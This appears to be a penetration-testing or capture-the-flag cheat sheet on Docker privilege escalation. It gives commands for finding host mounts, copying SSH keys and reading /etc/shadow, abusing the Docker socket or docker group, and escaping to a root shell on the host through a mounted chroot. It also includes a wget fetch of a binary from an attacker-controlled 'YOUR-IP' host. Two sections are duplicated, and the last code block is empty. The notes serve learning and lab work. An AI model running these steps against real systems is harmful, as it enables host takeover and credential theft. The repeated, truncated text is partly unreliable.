> Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

## Docker Architecture

At the core of the Docker architecture lies a client-server model, where we have two primary components:

- The Docker daemon
- The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

## Docker Privilege Escalation
- When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.
# Docker Privilege Escalation

> **Goal:** Escape the Docker container or gain root privileges on the host system.

---

# Theory (Know This)

Docker containers are **not virtual machines**.

They share the host's Linux kernel. If Docker is misconfigured (mounted host directories, Docker socket access, docker group membership, etc.), an attacker may be able to interact with the host directly.

The objective is always one of these:

- Access the host filesystem
- Control the Docker daemon
- Launch a privileged container
- Read sensitive files from the host
- Become root on the host

---

# Enumeration Strategy

Whenever Docker is involved, ask yourself these questions:

```
Am I inside a container?
        │
        ▼
Can I access the host filesystem?
        │
        ▼
Can I control Docker?
        │
        ▼
Can I create my own privileged container?
        │
        ▼
Can I access root files?
```

---

# 1. Am I Inside a Docker Container?

## Why?

Before attempting Docker privilege escalation, you need to know whether your shell is running **inside a container**.

If yes, you should begin looking for ways to **escape to the host**.

---

## Check

```bash
cat /proc/1/cgroup

ls -la /.dockerenv

hostname
```

# 2. Look for Mounted Host Directories

## Why?

A Docker container can mount directories from the host.

Example:

```
Host
└── /
     └── home

Container
└── /hostsystem
```

Anything under `/hostsystem` is actually the **host filesystem**.

If the mount is read-write, you may modify the host.

If it contains SSH keys or flags, you can immediately compromise the host.

---

## Check

```bash
mount

df -h

find / -type d 2>/dev/null | grep -Ei "host|mnt|shared|volume"
```

Interesting directories:

```
/host
/hostsystem
/shared
/mnt
/data
```

---

## What If You Find One?

Browse it.

```bash
cd /hostsystem

ls -la
```

Does it contain?

```
home/
root/
etc/
var/
```

If yes...

Congratulations.

You now have direct access to part of the host filesystem.

---

## What To Look For

### SSH Keys

```bash
find /hostsystem -name id_rsa 2>/dev/null
```

If found:

```bash
cp id_rsa ~/id_rsa

chmod 600 id_rsa

ssh user@HOST -i id_rsa
```

---

### Root Directory

```
/hostsystem/root
```

Look for:

```
flag.txt

.bash_history

.ssh/
```

---

### Password Files

```
/hostsystem/etc/passwd

/hostsystem/etc/shadow
```

---

## Why This Works

Docker is exposing the host filesystem inside the container.

Reading files inside `/hostsystem` is the same as reading files directly on the host.

---

# 3. Search for Docker Socket

## Why?

The Docker socket is essentially an API for the Docker daemon.

Anyone who can communicate with it can usually create new containers.

Creating containers means creating **root processes**.

Therefore:

**Docker socket access ≈ root access**

---

## Locate It

```bash
find / -name docker.sock 2>/dev/null
```

Common locations:

```
/var/run/docker.sock

/run/docker.sock

/app/docker.sock
```

---

## Check Permissions

```bash
ls -l /var/run/docker.sock
```

Example:

```
srw-rw---- root docker
```

---

## Test Access

```bash
docker -H unix:///var/run/docker.sock ps
```

or

```bash
docker -H unix:///app/docker.sock ps
```

---

## If Docker Isn't Installed

Download a static binary.

```bash
wget http://YOUR-IP/docker

chmod +x docker
```

---

## Successful Result

```
CONTAINER ID
IMAGE
STATUS
```

This means you can control Docker.

---

## Next Step

Create your own privileged container.

---

# 4. Docker Group

## Why?

Users inside the **docker** group can communicate with the Docker daemon.

Docker creates root-owned containers.

Therefore:

```
docker group
        =
root
```

---

## Check

```bash
id

groups
```

---

## Success

```
groups=...,docker
```

---

## Next Step

List images.

```bash
docker image ls
```

Use one of them to launch a container.

# 5. Escape Using Docker

## Why?

If Docker allows you to launch containers, you can simply mount the host filesystem.

```
Host /

↓

Container /mnt

↓

chroot

↓

Root shell
```

---

## Command

```bash
docker run \
--rm \
-it \
-v /:/mnt \
ubuntu \
chroot /mnt bash
```

Sometimes you'll also need:

```bash
--privileged
```

---

## What Happens?

```
Host

/
├── root
├── etc
├── home

↓

Container

/mnt
```

Running

```bash
chroot /mnt bash
```

changes the container's root directory to the host's filesystem.

Now you're effectively working on the host.

---

## Verify

```bash
whoami

hostname

pwd
```

Read:

```bash
cat /root/flag.txt
```

---

# 6. Writable Docker Socket

## Why?

Normally only:

- root
- docker group

can use the socket.

Sometimes the permissions are incorrect.

Even a low-privileged user can communicate with Docker.

---

## Check

```bash
ls -l /var/run/docker.sock
```

If writable:

```
rw
```

exploit it exactly the same way.

```bash
docker run \
-v /:/mnt \
--rm \
-it \
ubuntu \
chroot /mnt bash
```

# 5. Escape Using Docker

## Why?

If Docker allows you to launch containers, you can simply mount the host filesystem.

```
Host /

↓

Container /mnt

↓

chroot

↓

Root shell
```

---

## Command

```bash
docker run \
--rm \
-it \
-v /:/mnt \
ubuntu \
chroot /mnt bash
```

Sometimes you'll also need:

```bash
--privileged
```

---

## What Happens?

```
Host

/
├── root
├── etc
├── home

↓

Container

/mnt
```

Running

```bash
chroot /mnt bash
```

changes the container's root directory to the host's filesystem.

Now you're effectively working on the host.

---

## Verify

```bash
whoami

hostname

pwd
```

Read:

```bash
cat /root/flag.txt
```

# 6. Writable Docker Socket

## Why?

Normally only:

- root
- docker group

can use the socket.

Sometimes the permissions are incorrect.

Even a low-privileged user can communicate with Docker.

---

## Check

```bash
ls -l /var/run/docker.sock
```

If writable:

```

```

exploit it exactly the same way.
